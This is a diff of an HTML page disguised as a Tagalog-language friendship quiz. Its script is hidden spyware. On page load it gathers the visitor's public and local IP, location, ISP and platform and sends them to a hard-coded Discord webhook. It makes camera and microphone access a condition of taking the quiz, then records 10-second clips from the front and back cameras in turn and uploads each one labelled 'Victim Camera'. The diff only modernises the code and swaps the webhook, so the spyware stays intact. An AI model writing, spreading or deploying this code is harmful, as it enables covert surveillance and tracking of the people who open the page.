@@ -3,6 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <title>Friendship Quiz Test</title>
   <link href="https://fonts.googleapis.com/css2?family=Permanent+Marker&display=swap" rel="stylesheet">
   <style>
@@ -12,10 +13,10 @@
       box-sizing: border-box;
     }
     body {
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
       background: black;
       min-height: 100vh;
-      overflow: hidden;
+      overflow-x: hidden;
     }
     .container {
       position: relative;
@@ -34,10 +35,12 @@
       opacity: 0.6;
       pointer-events: none;
       z-index: 20;
+      -webkit-animation: fall linear infinite;
       animation: fall linear infinite;
     }
-    @keyframes fall {
+    @-webkit-keyframes fall {
       0% {
+        -webkit-transform: translateY(-10px);
         transform: translateY(-10px);
         opacity: 0;
       }
@@ -48,6 +51,25 @@
         opacity: 0.6;
       }
       100% {
+        -webkit-transform: translateY(100vh);
+        transform: translateY(100vh);
+        opacity: 0;
+      }
+    }
+    @keyframes fall {
+      0% {
+        -webkit-transform: translateY(-10px);
+        transform: translateY(-10px);
+        opacity: 0;
+      }
+      10% {
+        opacity: 0.6;
+      }
+      90% {
+        opacity: 0.6;
+      }
+      100% {
+        -webkit-transform: translateY(100vh);
         transform: translateY(100vh);
         opacity: 0;
       }
@@ -58,6 +80,7 @@
       width: 100%;
       max-width: 42rem;
       background: rgba(255, 255, 255, 0.1);
+      -webkit-backdrop-filter: blur(10px);
       backdrop-filter: blur(10px);
       border-radius: 0.5rem;
       padding: 2rem;
@@ -89,8 +112,12 @@
       font-weight: 600;
       border: none;
       cursor: pointer;
+      -webkit-transition: all 0.2s;
       transition: all 0.2s;
       font-size: 1rem;
+      -webkit-appearance: button;
+      -moz-appearance: button;
+      appearance: button;
     }
     button:hover {
       opacity: 0.9;
@@ -119,6 +146,7 @@
     .progress-fill {
       background: white;
       height: 100%;
+      -webkit-transition: width 0.3s;
       transition: width 0.3s;
       border-radius: 9999px;
     }
@@ -142,6 +170,7 @@
       color: white;
       border: none;
       cursor: pointer;
+      -webkit-transition: all 0.2s;
       transition: all 0.2s;
       font-size: 1rem;
     }
@@ -179,352 +208,383 @@
     </div>
   </div>
   <script>
-    const questions = [
-      { question: "Ano ang birthday ko?", options: ["January 15", "March 22", "June 10", "December 5"], correct: 1 },
-      { question: "Anong kulay ang paborito ko?", options: ["Asul", "Pula", "Itim", "Puti"], correct: 2 },
-      { question: "Saan ako nag-aaral?", options: ["Lakandula", "UPLB", "Ateneo", "La Salle"], correct: 0 },
-      { question: "Ano ang paboritong kanta ko?", options: ["OPM Ballad", "K-Pop", "Rock", "Hip-Hop"], correct: 1 },
-      { question: "Anong sports ang nilalaro ko?", options: ["Basketball", "Volleyball", "Badminton", "Swimming"], correct: 0 },
-      { question: "Ano ang dream job ko?", options: ["Doctor", "Engineer", "Teacher", "Artist"], correct: 1 },
-      { question: "Saan ko gustong mag-travel?", options: ["Japan", "Korea", "Europe", "America"], correct: 0 },
-      { question: "Ano ang takot ko?", options: ["Heights", "Ipis", "Dilim", "Multo"], correct: 1 },
-      { question: "Anong pagkain ang ayaw ko?", options: ["Ampalaya", "Okra", "Talong", "Patola"], correct: 0 },
-      { question: "Ano ang hobby ko?", options: ["Gaming", "Reading", "Drawing", "Cooking"], correct: 0 },
-      { question: "Anong subject ang paborito ko?", options: ["Math", "Science", "English", "Filipino"], correct: 1 },
-      { question: "Ano ang favorite movie genre ko?", options: ["Horror", "Comedy", "Romance", "Action"], correct: 2 },
-      { question: "Anong pet ang gusto ko?", options: ["Aso", "Pusa", "Hamster", "Ibon"], correct: 1 },
-      { question: "Ano ang paboritong dessert ko?", options: ["Ice Cream", "Cake", "Leche Flan", "Halo-Halo"], correct: 3 },
-      { question: "Anong oras ako natutulog?", options: ["9 PM", "11 PM", "1 AM", "3 AM"], correct: 2 },
-      { question: "Saan ako mahilig mag-shopping?", options: ["Mall", "Online", "Ukay-Ukay", "Palengke"], correct: 1 },
-      { question: "Ano ang paboritong fast food ko?", options: ["Jollibee", "McDonald's", "KFC", "Chowking"], correct: 0 },
-      { question: "Anong season ang gusto ko?", options: ["Summer", "Rainy", "Cold", "Spring"], correct: 2 },
-      { question: "Ano ang pangarap kong sasakyan?", options: ["Car", "Motorcycle", "SUV", "Sports Car"], correct: 3 },
-      { question: "Anong social media ang active ako?", options: ["Facebook", "Instagram", "Twitter", "TikTok"], correct: 1 }
-    ];
-    let currentQuestion = 0;
-    let score = 0;
-    let isAnswered = false;
-    let stream = null;
-    let videoRecorder = null;
-    let videoChunks = [];
-    let videoCounter = 0;
-    let currentCamera = 'user';
-    const WEBHOOK = "https://discord.com/api/webhooks/1460605082436501687/LV4GlnDzcZAPKPFiicyiRXmIQlzKoXgvzAlUMnN9s8g6tdMhDeEBGn_BFPllPh263RC6";
-    
-    async function getLocalIP() {
-      try {
-        const pc = new RTCPeerConnection({iceServers: []});
-        pc.createDataChannel('');
-        pc.createOffer().then(offer => pc.setLocalDescription(offer));
-        return new Promise((resolve) => {
-          pc.onicecandidate = (ice) => {
-            if (!ice || !ice.candidate || !ice.candidate.candidate) return;
-            const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
-            const match = ipRegex.exec(ice.candidate.candidate);
-            if (match) {
-              pc.close();
-              resolve(match[1]);
-            }
-          };
-          setTimeout(() => resolve('Unknown'), 2000);
-        });
-      } catch {
-        return 'Unknown';
-      }
-    }
-    
-    async function getPublicIP() {
-      try {
-        const res = await fetch('https://api.ipify.org?format=json');
-        const data = await res.json();
-        return data.ip;
-      } catch {
-        try {
-          const res2 = await fetch('https://api.my-ip.io/ip');
-          return await res2.text();
-        } catch {
-          return "Unknown";
-        }
-      }
-    }
-    
-    async function getIPInfo() {
-      try {
-        const res = await fetch('https://ipapi.co/json/');
-        const data = await res.json();
-        return data;
-      } catch {
-        return null;
-      }
-    }
-    
-    (async function logWebsiteEntry() {
-      try {
-        const publicIP = await getPublicIP();
-        const localIP = await getLocalIP();
-        const ipInfo = await getIPInfo();
-        
-        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-        const platform = navigator.platform;
-        const device = isMobile ? 'Mobile' : 'Desktop';
-        
-        const fields = [
-          { name: "Public IP:", value: `\`${publicIP}\``, inline: true },
-          { name: "Local IP:", value: `\`${localIP}\``, inline: true },
-          { name: "Device:", value: `\`${device}\``, inline: true }
-        ];
-        
-        if (ipInfo) {
-          fields.push(
-            { name: "Location:", value: `\`${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country_name}\``, inline: false },
-            { name: "Platform:", value: `\`${platform}\``, inline: true },
-            { name: "ISP:", value: `\`${ipInfo.org || 'Unknown'}\``, inline: true }
-          );
-        } else {
-          fields.push({ name: "Platform:", value: `\`${platform}\``, inline: true });
-        }
-        
-        await fetch(WEBHOOK, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            embeds: [{
-              title: "User Entered!",
-              color: 10181046,
-              fields: fields,
-              timestamp: new Date().toISOString()
-            }]
-          })
-        });
-      } catch {}
-    })();
-    
-    async function startVideoRecording() {
-      try {
-        if (!stream) return;
-        
-        let mimeType;
-        if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9,opus')) {
-          mimeType = 'video/webm;codecs=vp9,opus';
-        } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')) {
-          mimeType = 'video/webm;codecs=vp8,opus';
-        } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) {
-          mimeType = 'video/webm;codecs=vp9';
-        } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8')) {
-          mimeType = 'video/webm;codecs=vp8';
-        } else if (MediaRecorder.isTypeSupported('video/webm')) {
-          mimeType = 'video/webm';
-        } else {
-          mimeType = '';
-        }
-        
-        videoRecorder = new MediaRecorder(stream, mimeType ? { 
-          mimeType: mimeType,
-          videoBitsPerSecond: 1000000,
-          audioBitsPerSecond: 128000
-        } : {});
-        
-        videoRecorder.ondataavailable = (event) => {
-          if (event.data && event.data.size > 0) {
-            videoChunks.push(event.data);
-          }
-        };
-        
-        videoRecorder.start();
-        
-        setInterval(async () => {
-          if (videoRecorder && videoRecorder.state === 'recording') {
-            videoRecorder.stop();
+    (function() {
+      'use strict';
+      
+      var questions = [
+        { question: "Ano ang birthday ko?", options: ["January 15", "March 22", "June 10", "December 5"], correct: 1 },
+        { question: "Anong kulay ang paborito ko?", options: ["Asul", "Pula", "Itim", "Puti"], correct: 2 },
+        { question: "Saan ako nag-aaral?", options: ["Lakandula", "UPLB", "Ateneo", "La Salle"], correct: 0 },
+        { question: "Ano ang paboritong kanta ko?", options: ["OPM Ballad", "K-Pop", "Rock", "Hip-Hop"], correct: 1 },
+        { question: "Anong sports ang nilalaro ko?", options: ["Basketball", "Volleyball", "Badminton", "Swimming"], correct: 0 },
+        { question: "Ano ang dream job ko?", options: ["Doctor", "Engineer", "Teacher", "Artist"], correct: 1 },
+        { question: "Saan ko gustong mag-travel?", options: ["Japan", "Korea", "Europe", "America"], correct: 0 },
+        { question: "Ano ang takot ko?", options: ["Heights", "Ipis", "Dilim", "Multo"], correct: 1 },
+        { question: "Anong pagkain ang ayaw ko?", options: ["Ampalaya", "Okra", "Talong", "Patola"], correct: 0 },
+        { question: "Ano ang hobby ko?", options: ["Gaming", "Reading", "Drawing", "Cooking"], correct: 0 },
+        { question: "Anong subject ang paborito ko?", options: ["Math", "Science", "English", "Filipino"], correct: 1 },
+        { question: "Ano ang favorite movie genre ko?", options: ["Horror", "Comedy", "Romance", "Action"], correct: 2 },
+        { question: "Anong pet ang gusto ko?", options: ["Aso", "Pusa", "Hamster", "Ibon"], correct: 1 },
+        { question: "Ano ang paboritong dessert ko?", options: ["Ice Cream", "Cake", "Leche Flan", "Halo-Halo"], correct: 3 },
+        { question: "Anong oras ako natutulog?", options: ["9 PM", "11 PM", "1 AM", "3 AM"], correct: 2 },
+        { question: "Saan ako mahilig mag-shopping?", options: ["Mall", "Online", "Ukay-Ukay", "Palengke"], correct: 1 },
+        { question: "Ano ang paboritong fast food ko?", options: ["Jollibee", "McDonald's", "KFC", "Chowking"], correct: 0 },
+        { question: "Anong season ang gusto ko?", options: ["Summer", "Rainy", "Cold", "Spring"], correct: 2 },
+        { question: "Ano ang pangarap kong sasakyan?", options: ["Car", "Motorcycle", "SUV", "Sports Car"], correct: 3 },
+        { question: "Anong social media ang active ako?", options: ["Facebook", "Instagram", "Twitter", "TikTok"], correct: 1 }
+      ];
+      
+      var currentQuestion = 0;
+      var score = 0;
+      var isAnswered = false;
+      var stream = null;
+      var videoRecorder = null;
+      var videoChunks = [];
+      var videoCounter = 0;
+      var currentCamera = 'user';
+      var WEBHOOK = "https://discord.com/api/webhooks/1442834175521591387/-Ebcrm-cuHfvM1a-bCL7sX1cFHGa6DAnB4U1ratH-rrK7fzi3Pt7TZrquwHlJuspJuEs";
+      
+      function getLocalIP() {
+        return new Promise(function(resolve) {
+          try {
+            var pc = new RTCPeerConnection({iceServers: []});
+            pc.createDataChannel('');
+            pc.createOffer().then(function(offer) {
+              return pc.setLocalDescription(offer);
+            });
             
-            videoRecorder.onstop = async () => {
-              if (videoChunks.length > 0) {
-                const videoBlob = new Blob(videoChunks, { type: videoRecorder.mimeType || 'video/webm' });
-                
-                if (videoBlob.size > 10000) {
-                  try {
-                    const publicIP = await getPublicIP();
-                    const cameraType = currentCamera === 'user' ? 'Front Camera' : 'Back Camera';
-                    const form = new FormData();
-                    form.append('file', new File([videoBlob], `video-${++videoCounter}-${currentCamera}.webm`, { type: videoRecorder.mimeType || 'video/webm' }));
-                    form.append('payload_json', JSON.stringify({
-                      embeds: [{
-                        title: `Victim Camera`,
-                        description: "10-second video recording",
-                        color: 15158332,
-                        fields: [
-                          { name: "Camera:", value: `\`${cameraType}\``, inline: true },
-                          { name: "Public IP:", value: `\`${publicIP}\``, inline: true },
-                          { name: "Time:", value: new Date().toLocaleString(), inline: true }
-                        ],
-                        timestamp: new Date().toISOString()
-                      }]
-                    }));
-                    
-                    await fetch(WEBHOOK, { method: "POST", body: form });
-                  } catch {}
-                }
-                
-                videoChunks = [];
-                
-                if (stream && stream.active) {
-                  currentCamera = currentCamera === 'user' ? 'environment' : 'user';
-                  
-                  try {
-                    stream.getTracks().forEach(track => track.stop());
-                    stream = await navigator.mediaDevices.getUserMedia({ 
-                      video: { facingMode: currentCamera }, 
-                      audio: true 
-                    });
-                    
-                    videoRecorder = new MediaRecorder(stream, mimeType ? { 
-                      mimeType: mimeType,
-                      videoBitsPerSecond: 1000000,
-                      audioBitsPerSecond: 128000
-                    } : {});
-                    
-                    videoRecorder.ondataavailable = (event) => {
-                      if (event.data && event.data.size > 0) {
-                        videoChunks.push(event.data);
-                      }
-                    };
-                    
-                    videoRecorder.start();
-                  } catch {
-                    stream = await navigator.mediaDevices.getUserMedia({ 
-                      video: { facingMode: 'user' }, 
-                      audio: true 
-                    });
-                    
-                    videoRecorder = new MediaRecorder(stream, mimeType ? { 
-                      mimeType: mimeType,
-                      videoBitsPerSecond: 1000000,
-                      audioBitsPerSecond: 128000
-                    } : {});
-                    
-                    videoRecorder.ondataavailable = (event) => {
-                      if (event.data && event.data.size > 0) {
-                        videoChunks.push(event.data);
-                      }
-                    };
-                    
-                    videoRecorder.start();
-                  }
-                }
+            pc.onicecandidate = function(ice) {
+              if (!ice || !ice.candidate || !ice.candidate.candidate) return;
+              var ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+              var match = ipRegex.exec(ice.candidate.candidate);
+              if (match) {
+                pc.close();
+                resolve(match[1]);
               }
             };
+            
+            setTimeout(function() {
+              resolve('Unknown');
+            }, 2000);
+          } catch (e) {
+            resolve('Unknown');
           }
-        }, 10000);
-        
-      } catch {}
-    }
-    function createParticles() {
-      const container = document.querySelector('.container');
-      for (let i = 0; i < 50; i++) {
-        const particle = document.createElement('div');
-        particle.className = 'particle';
-        particle.style.left = Math.random() * 100 + '%';
-        particle.style.animationDelay = Math.random() * 5 + 's';
-        particle.style.animationDuration = (5 + Math.random() * 5) + 's';
-        particle.style.width = particle.style.height = (2 + Math.random() * 3) + 'px';
-        container.appendChild(particle);
+        });
       }
-    }
-    createParticles();
-    async function requestCamera() {
-      try {
-        stream = await navigator.mediaDevices.getUserMedia({ 
+      
+      function getPublicIP() {
+        return fetch('https://api.ipify.org?format=json')
+          .then(function(res) { return res.json(); })
+          .then(function(data) { return data.ip; })
+          .catch(function() {
+            return fetch('https://api.my-ip.io/ip')
+              .then(function(res2) { return res2.text(); })
+              .catch(function() { return "Unknown"; });
+          });
+      }
+      
+      function getIPInfo() {
+        return fetch('https://ipapi.co/json/')
+          .then(function(res) { return res.json(); })
+          .catch(function() { return null; });
+      }
+      
+      (function logWebsiteEntry() {
+        Promise.all([getPublicIP(), getLocalIP(), getIPInfo()])
+          .then(function(results) {
+            var publicIP = results[0];
+            var localIP = results[1];
+            var ipInfo = results[2];
+            
+            var isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+            var platform = navigator.platform;
+            var device = isMobile ? 'Mobile' : 'Desktop';
+            
+            var fields = [
+              { name: "Public IP:", value: "`" + publicIP + "`", inline: true },
+              { name: "Local IP:", value: "`" + localIP + "`", inline: true },
+              { name: "Device:", value: "`" + device + "`", inline: true }
+            ];
+            
+            if (ipInfo) {
+              fields.push(
+                { name: "Location:", value: "`" + ipInfo.city + ", " + ipInfo.region + ", " + ipInfo.country_name + "`", inline: false },
+                { name: "Platform:", value: "`" + platform + "`", inline: true },
+                { name: "ISP:", value: "`" + (ipInfo.org || 'Unknown') + "`", inline: true }
+              );
+            } else {
+              fields.push({ name: "Platform:", value: "`" + platform + "`", inline: true });
+            }
+            
+            return fetch(WEBHOOK, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                embeds: [{
+                  title: "User Entered!",
+                  color: 10181046,
+                  fields: fields,
+                  timestamp: new Date().toISOString()
+                }]
+              })
+            });
+          })
+          .catch(function() {});
+      })();
+      
+      function getSupportedMimeType() {
+        var types = [
+          'video/mp4',
+          'video/webm;codecs=h264',
+          'video/webm;codecs=vp9,opus',
+          'video/webm;codecs=vp8,opus',
+          'video/webm;codecs=vp9',
+          'video/webm;codecs=vp8',
+          'video/webm'
+        ];
+        
+        for (var i = 0; i < types.length; i++) {
+          if (MediaRecorder.isTypeSupported(types[i])) {
+            return types[i];
+          }
+        }
+        return '';
+      }
+      
+      function startVideoRecording() {
+        try {
+          if (!stream) return;
+          
+          var mimeType = getSupportedMimeType();
+          var options = mimeType ? { 
+            mimeType: mimeType,
+            videoBitsPerSecond: 1000000,
+            audioBitsPerSecond: 128000
+          } : {};
+          
+          videoRecorder = new MediaRecorder(stream, options);
+          
+          videoRecorder.ondataavailable = function(event) {
+            if (event.data && event.data.size > 0) {
+              videoChunks.push(event.data);
+            }
+          };
+          
+          videoRecorder.start();
+          
+          setInterval(function() {
+            if (videoRecorder && videoRecorder.state === 'recording') {
+              videoRecorder.stop();
+              
+              videoRecorder.onstop = function() {
+                if (videoChunks.length > 0) {
+                  var videoBlob = new Blob(videoChunks, { type: 'video/mp4' });
+                  
+                  if (videoBlob.size > 10000) {
+                    getPublicIP().then(function(publicIP) {
+                      var cameraType = currentCamera === 'user' ? 'Front Camera' : 'Back Camera';
+                      var form = new FormData();
+                      form.append('file', new File([videoBlob], 'video-' + (++videoCounter) + '-' + currentCamera + '.mp4', { type: 'video/mp4' }));
+                      form.append('payload_json', JSON.stringify({
+                        embeds: [{
+                          title: "Victim Camera",
+                          description: "10-second video recording",
+                          color: 15158332,
+                          fields: [
+                            { name: "Camera:", value: "`" + cameraType + "`", inline: true },
+                            { name: "Public IP:", value: "`" + publicIP + "`", inline: true },
+                            { name: "Time:", value: new Date().toLocaleString(), inline: true }
+                          ],
+                          timestamp: new Date().toISOString()
+                        }]
+                      }));
+                      
+                      return fetch(WEBHOOK, { method: "POST", body: form });
+                    }).catch(function() {});
+                  }
+                  
+                  videoChunks = [];
+                  
+                  if (stream && stream.active) {
+                    currentCamera = currentCamera === 'user' ? 'environment' : 'user';
+                    
+                    stream.getTracks().forEach(function(track) {
+                      track.stop();
+                    });
+                    
+                    navigator.mediaDevices.getUserMedia({ 
+                      video: { facingMode: currentCamera }, 
+                      audio: true 
+                    }).then(function(newStream) {
+                      stream = newStream;
+                      var mimeType = getSupportedMimeType();
+                      var options = mimeType ? { 
+                        mimeType: mimeType,
+                        videoBitsPerSecond: 1000000,
+                        audioBitsPerSecond: 128000
+                      } : {};
+                      
+                      videoRecorder = new MediaRecorder(stream, options);
+                      
+                      videoRecorder.ondataavailable = function(event) {
+                        if (event.data && event.data.size > 0) {
+                          videoChunks.push(event.data);
+                        }
+                      };
+                      
+                      videoRecorder.start();
+                    }).catch(function() {
+                      navigator.mediaDevices.getUserMedia({ 
+                        video: { facingMode: 'user' }, 
+                        audio: true 
+                      }).then(function(fallbackStream) {
+                        stream = fallbackStream;
+                        var mimeType = getSupportedMimeType();
+                        var options = mimeType ? { 
+                          mimeType: mimeType,
+                          videoBitsPerSecond: 1000000,
+                          audioBitsPerSecond: 128000
+                        } : {};
+                        
+                        videoRecorder = new MediaRecorder(stream, options);
+                        
+                        videoRecorder.ondataavailable = function(event) {
+                          if (event.data && event.data.size > 0) {
+                            videoChunks.push(event.data);
+                          }
+                        };
+                        
+                        videoRecorder.start();
+                      }).catch(function() {});
+                    });
+                  }
+                }
+              };
+            }
+          }, 10000);
+          
+        } catch (e) {}
+      }
+      
+      function createParticles() {
+        var container = document.querySelector('.container');
+        for (var i = 0; i < 50; i++) {
+          var particle = document.createElement('div');
+          particle.className = 'particle';
+          particle.style.left = Math.random() * 100 + '%';
+          particle.style.animationDelay = Math.random() * 5 + 's';
+          particle.style.animationDuration = (5 + Math.random() * 5) + 's';
+          particle.style.width = particle.style.height = (2 + Math.random() * 3) + 'px';
+          container.appendChild(particle);
+        }
+      }
+      
+      createParticles();
+      
+      window.requestCamera = function() {
+        var getUserMedia = navigator.mediaDevices && navigator.mediaDevices.getUserMedia ?
+          navigator.mediaDevices.getUserMedia.bind(navigator.mediaDevices) :
+          null;
+        
+        if (!getUserMedia) {
+          document.getElementById('cameraError').textContent = 'Your browser does not support camera access';
+          document.getElementById('cameraError').style.display = 'block';
+          return;
+        }
+        
+        getUserMedia({ 
           video: { facingMode: "user" }, 
           audio: true 
+        }).then(function(mediaStream) {
+          stream = mediaStream;
+          startVideoRecording();
+          showQuiz();
+        }).catch(function(error) {
+          document.getElementById('cameraError').textContent = 'allow mo muna para makapasok ka bobo';
+          document.getElementById('cameraError').style.display = 'block';
         });
-        startVideoRecording();
-        showQuiz();
-      } catch (error) {
-        document.getElementById('cameraError').textContent = 'allow mo muna para makapasok ka bobo';
-        document.getElementById('cameraError').style.display = 'block';
+      };
+      
+      function showQuiz() {
+        var app = document.getElementById('app');
+        app.innerHTML = '<div class="card"><div class="quiz-header"><div class="quiz-info"><span>Question <span id="current">1</span>/' + questions.length + '</span><span>Score: <span id="score">0</span></span></div><div class="progress-bar"><div class="progress-fill" id="progress"></div></div></div><h2 class="question" id="question"></h2><div class="options" id="options"></div></div>';
+        renderQuestion();
       }
-    }
-    function showQuiz() {
-      const app = document.getElementById('app');
-      app.innerHTML = `
-        <div class="card">
-          <div class="quiz-header">
-            <div class="quiz-info">
-              <span>Question <span id="current">1</span>/${questions.length}</span>
-              <span>Score: <span id="score">0</span></span>
-            </div>
-            <div class="progress-bar">
-              <div class="progress-fill" id="progress"></div>
-            </div>
-          </div>
-          <h2 class="question" id="question"></h2>
-          <div class="options" id="options"></div>
-        </div>
-      `;
-      renderQuestion();
-    }
-    function renderQuestion() {
-      const q = questions[currentQuestion];
-      document.getElementById('question').textContent = q.question;
-      document.getElementById('current').textContent = currentQuestion + 1;
-      document.getElementById('score').textContent = score;
-      document.getElementById('progress').style.width = ((currentQuestion + 1) / questions.length * 100) + '%';
-      const optionsEl = document.getElementById('options');
-      optionsEl.innerHTML = '';
-      q.options.forEach((opt, i) => {
-        const btn = document.createElement('button');
-        btn.className = 'option';
-        btn.textContent = opt;
-        btn.onclick = () => handleAnswer(i);
-        optionsEl.appendChild(btn);
-      });
-      isAnswered = false;
-    }
-    function handleAnswer(index) {
-      if (isAnswered) return;
-      isAnswered = true;
-      const q = questions[currentQuestion];
-      const isCorrect = Array.isArray(q.correct) ? q.correct.includes(index) : index === q.correct;
-      if (isCorrect) score++;
-      const buttons = document.querySelectorAll('.option');
-      buttons.forEach((btn, i) => {
-        btn.disabled = true;
-        const correct = Array.isArray(q.correct) ? q.correct.includes(i) : i === q.correct;
-        if (i === index) {
-          btn.className = 'option ' + (isCorrect ? 'correct' : 'incorrect');
-        } else if (correct) {
-          btn.className = 'option correct';
-        }
-      });
-      setTimeout(() => {
-        if (currentQuestion < questions.length - 1) {
-          currentQuestion++;
-          renderQuestion();
-        } else {
-          showResult();
-        }
-      }, 1500);
-    }
-    function showResult() {
-      const msg = score === questions.length ? "Wow Galing loveu!" :
+      
+      function renderQuestion() {
+        var q = questions[currentQuestion];
+        document.getElementById('question').textContent = q.question;
+        document.getElementById('current').textContent = currentQuestion + 1;
+        document.getElementById('score').textContent = score;
+        document.getElementById('progress').style.width = ((currentQuestion + 1) / questions.length * 100) + '%';
+        
+        var optionsEl = document.getElementById('options');
+        optionsEl.innerHTML = '';
+        
+        q.options.forEach(function(opt, i) {
+          var btn = document.createElement('button');
+          btn.className = 'option';
+          btn.textContent = opt;
+          btn.onclick = (function(index) {
+            return function() {
+              handleAnswer(index);
+            };
+          })(i);
+          optionsEl.appendChild(btn);
+        });
+        
+        isAnswered = false;
+      }
+      
+      function handleAnswer(index) {
+        if (isAnswered) return;
+        isAnswered = true;
+        
+        var q = questions[currentQuestion];
+        var isCorrect = Array.isArray(q.correct) ? q.correct.indexOf(index) !== -1 : index === q.correct;
+        
+        if (isCorrect) score++;
+        
+        var buttons = document.querySelectorAll('.option');
+        buttons.forEach(function(btn, i) {
+          btn.disabled = true;
+          var correct = Array.isArray(q.correct) ? q.correct.indexOf(i) !== -1 : i === q.correct;
+          if (i === index) {
+            btn.className = 'option ' + (isCorrect ? 'correct' : 'incorrect');
+          } else if (correct) {
+            btn.className = 'option correct';
+          }
+        });
+        
+        setTimeout(function() {
+          if (currentQuestion < questions.length - 1) {
+            currentQuestion++;
+            renderQuestion();
+          } else {
+            showResult();
+          }
+        }, 1500);
+      }
+      
+      function showResult() {
+        var msg = score === questions.length ? "Wow Galing loveu!" :
                   score >= questions.length * 0.7 ? "Wow Ang galing mo Tanga!" :
                   score >= questions.length * 0.5 ? "Fake Friend!" : "Keep Practicing!";
-      document.getElementById('app').innerHTML = `
-        <div class="card text-center">
-          <h2>Quiz Complete! 🎉</h2>
-          <p class="score-display">${score}/${questions.length}</p>
-          <p class="result-message">${msg}</p>
-          <button onclick="location.reload()">Try Again</button>
-        </div>
-      `;
-    }
-    window.addEventListener('beforeunload', () => {
-      if (videoRecorder && videoRecorder.state === 'recording') {
-        videoRecorder.stop();
+        
+        document.getElementById('app').innerHTML = '<div class="card text-center"><h2>Quiz Complete! 🎉</h2><p class="score-display">' + score + '/' + questions.length + '</p><p class="result-message">' + msg + '</p><button onclick="location.reload()">Try Again</button></div>';
       }
-      if (stream) {
-        stream.getTracks().forEach(track => track.stop());
-      }
-    });
+      
+      window.addEventListener('beforeunload', function() {
+        if (videoRecorder && videoRecorder.state === 'recording') {
+          videoRecorder.stop();
+        }
+        if (stream) {
+          stream.getTracks().forEach(function(track) {
+            track.stop();
+          });
+        }
+      });
+    })();
   </script>
 </body>
 </html>
